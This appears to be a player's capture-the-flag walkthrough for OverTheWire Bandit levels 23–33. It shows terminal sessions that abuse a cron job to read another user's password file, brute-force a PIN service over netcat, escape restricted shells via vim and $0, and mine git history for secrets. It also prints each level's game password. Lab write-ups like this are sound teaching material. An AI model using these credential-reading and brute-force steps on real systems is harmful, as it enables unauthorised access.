# Bandit CTF Solutions Part III
# Level 23 -> Level 34


[+]Level 23 -> Level 24:

# A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

bandit23@bandit:~$ ls -la
total 20
drwxr-xr-x   2 root root 4096 Oct 14 09:25 .
drwxr-xr-x 150 root root 4096 Oct 14 09:29 ..
-rw-r--r--   1 root root  220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root root 3851 Oct 14 09:19 .bashrc
-rw-r--r--   1 root root  807 Mar 31  2024 .profile
bandit23@bandit:~$ ls /etc/cron.d
behemoth4_cleanup  cronjob_bandit22  cronjob_bandit24  leviathan5_cleanup    otw-tmp-dir
clean_tmp          cronjob_bandit23  e2scrub_all       manpage3_resetpw_job  sysstat
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24 
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash
shopt -s nullglob
myname=$(whoami)

cd /var/spool/"$myname"/foo || exit 
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
done

# To avoid permission issues when writing to the tmp directory, create a new directory and test the script there
bandit23@bandit:/tmp/kenobi$ ls -l
total 4
-rw-rw-r-- 1 bandit23 bandit23 68 Jan 19 19:17 pass24.sh
bandit23@bandit:/tmp/kenobi$ cat pass24.sh 
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/kenobi/passwd.txt
bandit23@bandit:/tmp/kenobi$ chmod 777 pass24.sh 
bandit23@bandit:/tmp/kenobi$ ls -l
total 4
-rwxrwxrwx 1 bandit23 bandit23 68 Jan 19 19:17 pass24.sh
bandit23@bandit:/tmp/kenobi$ touch passwd.txt
bandit23@bandit:/tmp/kenobi$ ls -l
total 4
-rwxrwxrwx 1 bandit23 bandit23 68 Jan 19 19:17 pass24.sh
-rw-rw-r-- 1 bandit23 bandit23  0 Jan 19 19:19 passwd.txt
bandit23@bandit:/tmp/kenobi$ chmod 666 passwd.txt 
bandit23@bandit:/tmp/kenobi$ cp pass24.sh /var/spool/bandit24
cp: cannot create regular file '/var/spool/bandit24/pass24.sh': Operation not permitted
bandit23@bandit:/tmp/kenobi$ cp pass24.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/kenobi$ ls -l
total 4
-rwxrwxrwx 1 bandit23 bandit23 68 Jan 19 19:17 pass24.sh
-rw-rw-rw- 1 bandit23 bandit23  0 Jan 19 19:19 passwd.txt
bandit23@bandit:/tmp/kenobi$ ls -l
total 8
-rwxrwxrwx 1 bandit23 bandit23 68 Jan 19 19:17 pass24.sh
-rw-rw-rw- 1 bandit23 bandit23 33 Jan 19 19:21 passwd.txt
bandit23@bandit:/tmp/kenobi$ cat passwd.txt 
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8			#bandit24 password
--------------------------------------------------------------------------------------------------------

[+] Level 24 -> Level 25:

# A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode.
# There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
# You do not need to create new connections each time

bandit24@bandit:~$ ncat localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 1234
Wrong! Please enter the correct current password and pincode. Try again.
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0101
Wrong! Please enter the correct current password and pincode. Try again.
^C
bandit24@bandit:/tmp/kenobi11$ ls -l
total 4
-rw-rw-r-- 1 bandit24 bandit24 145 Jan 19 19:40 next_level.sh
bandit24@bandit:/tmp/kenobi11$ cat next_level.sh 
#!/bin/bash

bandit24_pass=gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

for i in {1111..9999};
do
    echo "$bandit24_pass $i"
done | nc localhost 30002

bandit24@bandit:/tmp/kenobi11$ chmod +x next_level.sh
bandit24@bandit:/tmp/kenobi11$ ./next_level.sh 
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
.
.
.
.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4   #bandit25 password
--------------------------------------------------------------------------------------------------------

[+]Level 25 -> Level 26:

# Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else.
# Find out what it is, how it works and how to break out of it.

# During my tests, it was not possible to establish a connection from bandit25 to bandit26.
# For this reason, I downloaded sshkey and tested it on my own machine.

bandit25@bandit:~$ ls -l
total 4
-r-------- 1 bandit25 bandit25 1679 Oct 14 09:26 bandit26.sshkey
bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Could not create directory '/home/bandit25/.ssh' (Permission denied).
Failed to add the host to the list of known hosts (/home/bandit25/.ssh/known_hosts).

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

!!! You are trying to log into this SSH server on port 22, which is not intended.
!!! If you are trying to log in to an OverTheWire game, use the port mentioned in
!!! the "SSH Information" on that game's webpage (in the top left corner).

bandit26@localhost: Permission denied (publickey).
bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost -P 2220
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Could not create directory '/home/bandit25/.ssh' (Permission denied).
Failed to add the host to the list of known hosts (/home/bandit25/.ssh/known_hosts).

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

!!! You are trying to log into this SSH server on port 22, which is not intended.
!!! If you are trying to log in to an OverTheWire game, use the port mentioned in
!!! the "SSH Information" on that game's webpage (in the top left corner).

bandit26@localhost: Permission denied (publickey).
bandit25@bandit:~$ chmod 400 bandit26.sshkey 
chmod: changing permissions of 'bandit26.sshkey': Operation not permitted


# My own machine
❯ scp -P 2220 bandit25@bandit.labs.overthewire.org:/home/bandit25/bandit26.sshkey /home/kenobi/Downloads


~/Downloads
❯ chmod 400 bandit26.sshkey 

~/Downloads
❯ ssh -i bandit26.sshkey bandit26@bandit.labs.overthewire.org -p 2220
                         _                     _ _ _   
                        | |__   __ _ _ __   __| (_) |_ 
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_ 
                        |_.__/ \__,_|_| |_|\__,_|_|\__|
                                                       

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

backend: gibson-0

.
.
.
.
.
.

Connection to bandit.labs.overthewire.org closed.

~/Downloads
❯ ssh -t -i bandit26.sshkey bandit26@bandit.labs.overthewire.org -p 2220 '/bin/sh'
                         _                     _ _ _   
                        | |__   __ _ _ __   __| (_) |_ 
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_ 
                        |_.__/ \__,_|_| |_|\__,_|_|\__|
                                                       

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

backend: gibson-0
  _                     _ _ _   ___   __  
 | |                   | (_) | |__ \ / /  
 | |__   __ _ _ __   __| |_| |_   ) / /_  
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \ 
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
 |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/ 
Connection to bandit.labs.overthewire.org closed.

# This level is a bit tricky; it's possible to minimize the terminal screen to open "more" and then press the 'v' key to become bandit26 via vim.
# Things to do after Vim opens:
:set shell=/bin/bash
:shell
bandit26@bandit:~$ cat /etc/bandit_pass/bandit26
s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ		#bandit26 password

!!! bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
--------------------------------------------------------------------------------------------------------

[+]Level 26 -> Level 27:

# Good job getting a shell! Now hurry and grab the password for bandit27!

bandit26@bandit:~$ ls -l
total 20
-rwsr-x--- 1 bandit27 bandit26 14884 Oct 14 09:26 bandit27-do
-rw-r----- 1 bandit26 bandit26   258 Oct 14 09:26 text.txt
bandit26@bandit:~$ ./bandit27-do 
Run a command as another user.
  Example: ./bandit27-do id
bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB		#bandit27 password
--------------------------------------------------------------------------------------------------------

[+]Level 27 -> Level 28:

#There is a git repository at ssh://bandit27-git@bandit.labs.overthewire.org/home/bandit27-git/repo via the port 2220. The password for the user bandit27-git is the same as for the user bandit27.

# From your local machine (not the OverTheWire machine!), clone the repository and find the password for the next level. This needs git installed locally on your machine.

~/Downloads
❯ git clone ssh://bandit27-git@bandit.labs.overthewire.org:2220/home/bandit27-git/repo

~/Downloads
❯ ls 
drwxr-xr-x    - kenobi 20 Yan 00:27  repo

~/Downloads
❯ cd repo

~/Downloads/repo master
❯ ls
drwxr-xr-x  - kenobi 20 Yan 00:27  .git
.rw-r--r-- 68 kenobi 20 Yan 00:27 󰂺 README

~/Downloads/repo master
❯ cat README 
The password to the next level is: Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN 	#bandit28 password
--------------------------------------------------------------------------------------------------------

[+]Level 28 -> Level 29:

# There is a git repository at ssh://bandit28-git@bandit.labs.overthewire.org/home/bandit28-git/repo via the port 2220. The password for the user bandit28-git is the same as for the user bandit28.

# From your local machine (not the OverTheWire machine!), clone the repository and find the password for the next level. This needs git installed locally on your machine.

~/Downloads
❯ git clone ssh://bandit28-git@bandit.labs.overthewire.org:2220/home/bandit28-git/repo

~/Downloads
❯ ls -l
drwxr-xr-x   - kenobi 20 Yan 00:31  repo

~/Downloads/repo master
❯ ls -l
drwxr-xr-x   - kenobi 20 Yan 00:31  .git
.rw-r--r-- 111 kenobi 20 Yan 00:31 󰂺 README.md

~/Downloads/repo master
❯ cat README.md 
# Bandit Notes
Some notes for level29 of bandit.

## credentials

- username: bandit29
- password: xxxxxxxxxx

~/Downloads/repo master
❯ git branch -r
  origin/HEAD -> origin/master
  origin/master

~/Downloads/repo master
❯ git branch 
* master

❯ git log
commit b0354c7be30f500854c5fc971c57e9cbe632fef6 (HEAD -> master, origin/master, origin/HEAD)
Author: Morla Porla <morla@overthewire.org>
Date:   Tue Oct 14 09:26:19 2025 +0000

    fix info leak

commit d0cf2ab7dd7ebc6075b59102a980155268f0fe8f
Author: Morla Porla <morla@overthewire.org>
Date:   Tue Oct 14 09:26:19 2025 +0000

    add missing data

commit bd6bc3a57f81518bb2ce63f5816607a754ba730d
Author: Ben Dover <noone@overthewire.org>
Date:   Tue Oct 14 09:26:18 2025 +0000

    initial commit of README.md

~/Downloads/repo master
❯ git checkout d0cf2ab7dd7ebc6075b59102a980155268f0fe8f
Note: switching to 'd0cf2ab7dd7ebc6075b59102a980155268f0fe8f'.

~/Downloads/repo master~1
❯ ls -l
drwxr-xr-x   - kenobi 20 Yan 00:37  .git
.rw-r--r-- 133 kenobi 20 Yan 00:37 󰂺 README.md

~/Downloads/repo master~1
❯ cat README.md
# Bandit Notes
Some notes for level29 of bandit.

## credentials

- username: bandit29
- password: 4pT1t5DENaYuqnqvadYs1oE4QLCdjmJ7 		#bandit29 password

!!! Explanation:
The basic principle here is to find the password by working through Git commands. The Git log lists all commits (saved changes) made to the project up to that point, chronologically (from newest to oldest).
The `git checkout` command is a versatile navigation tool used in Git projects to go back in time, switch between branches, or restore files to their previous state.
Simply put, it updates your project's current working directory (where you see the files) to reflect a different version of the project.
--------------------------------------------------------------------------------------------------------

[+]Level 29 -> Level 30:

# There is a git repository at ssh://bandit29-git@bandit.labs.overthewire.org/home/bandit29-git/repo via the port 2220. The password for the user bandit29-git is the same as for the user bandit29.

~/Downloads
❯ git clone ssh://bandit29-git@bandit.labs.overthewire.org:2220/home/bandit29-git/repo

~/Downloads 10s
❯ cd repo/

~/Downloads/repo master
❯ ls -l
drwxr-xr-x   - kenobi 20 Yan 00:42  .git
.rw-r--r-- 131 kenobi 20 Yan 00:42 󰂺 README.md

~/Downloads/repo master
❯ cat README.md
# Bandit Notes
Some notes for bandit30 of bandit.

## credentials

- username: bandit30
- password: <no passwords in production!>

~/Downloads/repo master~1
❯ git branch -r
  origin/HEAD -> origin/master
  origin/dev
  origin/master
  origin/sploits-dev

~/Downloads/repo master~1
❯ git checkout dev
Previous HEAD position was 358fb1e initial commit of README.md
branch 'dev' set up to track 'origin/dev'.
Switched to a new branch 'dev'

~/Downloads/repo dev
❯ git branch
* dev
  master

~/Downloads/repo dev
❯ ls
drwxr-xr-x   - kenobi 20 Yan 00:47  .git
drwxr-xr-x   - kenobi 20 Yan 00:47  code
.rw-r--r-- 134 kenobi 20 Yan 00:47 󰂺 README.md


~/Downloads/repo dev
❯ cat README.md
# Bandit Notes
Some notes for bandit30 of bandit.

## credentials

- username: bandit30
- password: qp30ex3VLz5MDG1n91YowTv4Q8l7CDZL    #bandit30 password
--------------------------------------------------------------------------------------------------------

[+]Level 30 -> Level 31:

# There is a git repository at ssh://bandit30-git@bandit.labs.overthewire.org/home/bandit30-git/repo via the port 2220. The password for the user bandit30-git is the same as for the user bandit30.

~/Downloads
❯ git clone ssh://bandit30-git@bandit.labs.overthewire.org:2220/home/bandit30-git/repo

~/Downloads/repo master
❯ ls -l
drwxr-xr-x  - kenobi 20 Yan 00:51  .git
.rw-r--r-- 30 kenobi 20 Yan 00:51 󰂺 README.md

~/Downloads/repo master
❯ cat README.md
just an epmty file... muahaha

~/Downloads/repo master
❯ git branch
* master

~/Downloads/repo master
❯ git branch -r
  origin/HEAD -> origin/master
  origin/master

~/Downloads/repo master
❯ git log
commit 62152a9969c62cb647406aa88c1b5376dcf58968 (HEAD -> master, origin/master, origin/HEAD)
Author: Ben Dover <noone@overthewire.org>
Date:   Tue Oct 14 09:26:22 2025 +0000

    initial commit of README.md

~/Downloads/repo master
❯ git tag
secret

~/Downloads/repo master
❯ git show secret
fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy		#bandit31 password
--------------------------------------------------------------------------------------------------------

[+]Level 31 -> Level 32:

# There is a git repository at ssh://bandit31-git@bandit.labs.overthewire.org/home/bandit31-git/repo via the port 2220. The password for the user bandit31-git is the same as for the user bandit31.

~/Downloads
❯ git clone ssh://bandit31-git@bandit.labs.overthewire.org:2220/home/bandit31-git/repo

~/Downloads/repo master
❯ ls
drwxr-xr-x   - kenobi 20 Yan 00:56  .git
.rw-r--r--   6 kenobi 20 Yan 00:56 󰊢 .gitignore
.rw-r--r-- 147 kenobi 20 Yan 00:56 󰂺 README.md

~/Downloads/repo master
❯ cat README.md
This time your task is to push a file to the remote repository.

Details:
    File name: key.txt
    Content: 'May I come in?'
    Branch: master

~/Downloads/repo master
❯ cat .gitignore 
*.txt

~/Downloads/repo master
❯ rm .gitignore 

~/Downloads/repo master*
❯ echo "May I come in?" > key.txt

~/Downloads/repo master*
❯ git add key.txt 

~/Downloads/repo master*
❯ git commit -m "password"
[master 0210701] password
 1 file changed, 1 insertion(+)
 create mode 100644 key.txt

~/Downloads/repo master* ⇡
❯ git push

.
.
.
.

remote: Well done! Here is the password for the next level:
remote: 3O9RfhqyAlVBEZpVb6LYStshZoqoSx5K 			#bandit32 password

.
.
.
.


--------------------------------------------------------------------------------------------------------

[+]Level 32 -> Level 33:

# After all this git stuff, it’s time for another escape. Good luck!
# https://unix.stackexchange.com/questions/51983/how-to-uppercase-the-command-line-argument
# https://unix.stackexchange.com/questions/31414/how-can-i-pass-a-command-line-argument-into-a-shell-script

WELCOME TO THE UPPERCASE SHELL
>> hello
sh: 1: HELLO: Permission denied
>> ls
sh: 1: LS: Permission denied
>> cat test
sh: 1: CAT: Permission denied
>> $1
>> $0
$ whoami
bandit33
$ cat /etc/bandit_pass/bandit33
tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0  	  #bandit33 password
$ $SHELL
WELCOME TO THE UPPERCASE SHELL
>> $0
$ export SHELL=/bin/bash
$ SHELL
sh: 2: SHELL: Permission denied
$ $SHELL
bandit33@bandit:~$ ls
uppershell
bandit33@bandit:~$ cat /etc/bandit_pass/bandit33
tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0
--------------------------------------------------------------------------------------------------------

[+]Level 33 -> Level 34:

# At this moment, level 34 does not exist yet.

bandit33@bandit:~$ ls
README.txt
bandit33@bandit:~$ cat README.txt 
Congratulations on solving the last level of this game!

At this moment, there are no more levels to play in this game. However, we are constantly working
on new levels and will most likely expand this game with more levels soon.
Keep an eye out for an announcement on our usual communication channels!
In the meantime, you could play some of our other wargames.

If you have an idea for an awesome new level, please let us know!

:)
--------------------------------------------------------------------------------------------------------
